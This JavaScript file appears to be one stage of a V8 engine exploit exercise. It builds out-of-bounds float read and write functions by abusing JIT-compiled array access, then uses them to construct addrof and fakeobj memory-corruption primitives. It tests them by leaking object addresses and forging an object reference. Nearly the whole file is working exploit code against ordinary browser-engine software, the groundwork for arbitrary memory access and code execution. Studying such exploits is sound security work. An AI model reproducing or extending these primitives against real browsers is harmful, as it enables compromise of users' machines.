/*
  We now write addrof using fl_read from step1 (We already got an address in step1, we're just making it into a function), 
  and fakeobj using fl_write. We test fl_write by putting a real object in the place of another in an  array, 
  and then use fakeobj to make an object where a real object lives as another test

*/
// Utils, ftoi, itof, print hex
var buf = new ArrayBuffer(8);
// Views of buf for type punning
var f64_buf = new Float64Array(buf);
var u32_buf = new Uint32Array(buf);
function ftoi(val) {
  f64_buf[0] = val;
  return BigInt(u32_buf[0]) + (BigInt(u32_buf[1]) << 32n);
}
// low 32 bits of number/float value in the low 32 bits of BigInt output
function ftoi_low32(val) {
  f64_buf[0] = val;
  return BigInt(u32_buf[0]);
}
// high 32 bits of number/float value in the low 32 bits of BigInt output
function ftoi_hi32(val) {
  f64_buf[0] = val;
  return BigInt(u32_buf[1]);
}
function itof(val) {
  u32_buf[0] = Number(val & 0xffffffffn);
  u32_buf[1] = Number(val >> 32n);
  return f64_buf[0];
}
function print_hex(int) {
  console.log("0x" + int.toString(16).padStart(16, "0"));
}
function print_fptr(number) {
  print_hex(ftoi(number));
}
// Preserves high 32 bits
function compress_ptr(old_val, low_32bits_to_set) {
  return itof((ftoi_hi32(old_val) << 32n) + low_32bits_to_set);
}
// Preserves high 32 bits and applies the read offset used by JSArrays in reverse (-8 bytes)
function compress_elementptr(old_val, low_32bits_to_set) {
  // No idea why the -8n is needed (It's a 64bit/8byte offset). Length of the array stored before the elements?
  return compress_ptr(old_val, low_32bits_to_set - 8n);
}
// END UTILS

// idx must be 0..9, allows OOB reads in that range
// Reads idx in read_arr as a float value (addrof for heap objects not stored in-line)
function fl_read(read_arr, idx) {
    function oob_read(idx, map) {
        return map[idx]
    }
    function oob_write(idx, val, map) {
        map[idx] = val
    }
    
    let arr = [1.01, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9, 1.10];
    for(let i=0; i< 100*100*100+1; i++) {
        if (i==100*100*100) {arr = read_arr}
        let val = oob_read(idx, arr)
        oob_write(idx, val, arr);
        if (i==100*100*100) {
            return val;
        }
    }
}

// idx must be 0..9
// Writes the write_val float at idx in read_arr as a float value without modifying write_arr's map
// This should let us make a fakeobj
function fl_write(write_arr, idx, write_val) {
    function oob_read(idx, map) {
        return map[idx]
    }
    function oob_write(idx, val, map) {
        map[idx] = val
    }
    
    let arr = [1.01, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9, 1.10];
    let val = arr[0]
    for(let i=0; i< 100*100*100+1; i++) {
        if (i==100*100*100) {arr = write_arr}
        val = oob_read(idx, arr)
        if (i==100*100*100) {
            val = write_val;
        }
        oob_write(idx, val, arr);
    }
}

function addrof(obj) {
    let obj_arr = [obj];
    return fl_read(obj_arr, 0)
}

let obj_a = {"k":"a"};
let obj_b = {"k":"b"};
// Test array, we will try to replace obj_a with obj_b by writing a float
let test_arr = [obj_a]

// We execute this to waste time. Because of how slow fl_[read|write] are, objects move from "newspace" to "oldspace"
// (Which seems to be some generational GC thing). Doing this ensures everything above is in oldspace with stable addrs
{let x=[1.1]; fl_write(x, 0, 0);}

console.log("obj_a:");
%DebugPrint(obj_a);
console.log("Should be the leaked addr of obj_a")
let obj_a_addr = addrof(obj_a)
print_fptr(addrof(obj_a_addr))

console.log("obj_b:");
%DebugPrint(obj_b);
console.log("Should be the leaked addr of obj_b")
let obj_b_addr = addrof(obj_b)
print_fptr(obj_b_addr)

console.log("test_arr:");
%DebugPrint(test_arr)
console.log("test_arr[0].k:")
console.log(test_arr[0].k)

let old_val = fl_read(test_arr, 0)
let new_val = compress_ptr(old_val, ftoi(obj_b_addr) & 0xFFFFFFFFn);
console.log("Value being written to test_arr[0] as a float:");
print_fptr(new_val)
fl_write(test_arr, 0, new_val)
console.log("test_arr[0].k: (After write, should be obj_b)");
console.log(test_arr[0].k);
console.log("test_arr:");
%DebugPrint(test_arr)

function fakeobj(addr) {
  let obj = {"a":1}
  let obj_arr = [obj, obj]
  addr = ftoi(addr) & 0xFFFFFFFFn;
  addr = itof(addr | (addr << 32n))
  fl_write(obj_arr, 0, addr)
  return obj_arr[0]
}
console.log("fakeobj(obj_b_addr).k: (Should be 'b') ");
console.log(fakeobj(obj_b_addr).k)

while(true) {}